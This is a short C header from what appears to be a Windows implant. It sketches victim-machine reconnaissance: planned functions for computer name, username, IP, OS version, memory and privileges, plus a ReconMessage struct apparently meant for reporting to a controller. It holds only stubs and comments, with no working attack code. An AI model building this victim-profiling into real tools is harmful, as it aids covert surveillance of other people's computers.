/* recon.h */
/* recon.h anything related to information gathering */

#ifndef RECON_H
#define RECON_H

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
//#include <windef.h>

// NOTE: identifier for the victim machine
// generateId() 

// getComputerName()

// getUsername()

// getLocalIp()


// NOTE: is os linux, macos, windows? 32 or 64 bit
// getOsVersion()

// getRam()

// getProccessor/number threads

// NOTE: information related to the process, stuff like if it's 32/64bit
// getProcessInfo() ?

// getUserLanguage / getKeyboardLanguage / getCodePageOEM

// NOTE: is the user an admin or something?
// getPermissionLevel() 


// getSystemInfo()

// TODO: move this into message types?
typedef struct
{
	// _OSVERSIONINFOEXW
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	BYTE wProductType;

	DWORDLONG totalPhysicalMemory;
	DWORDLONG availablePhysicalMemory;

	DWORD numberOfProcessors;
	DWORD processorArchitecture; // TODO: this should be WORD? https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-system_info

	// localIp

	//this->username      = _GetUserName();
	//this->domain_name   = _GetDomainName();
	//this->computer_name = _GetHostName();
	//this->process_name  = _GetProcessName();

	//computername;
	//username;

	//CHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
	//CHAR userName[256];  // UNLEN + 1
	//CHAR domainName[256]; // DNS_MAX_NAME_BUFFER_LENGTH
	//CHAR processName[MAX_PATH];

} ReconMessage;


/*
 * GetVersionExA()
 * GetComputerNameA()
 * GetUserNameA()
 * GetSystemInfo()
 * GlobalMemoryStatusEx()
 * GetCurrentDirectoryA()
 * GetSystemDirectoryA()
 *
 * */


#endif
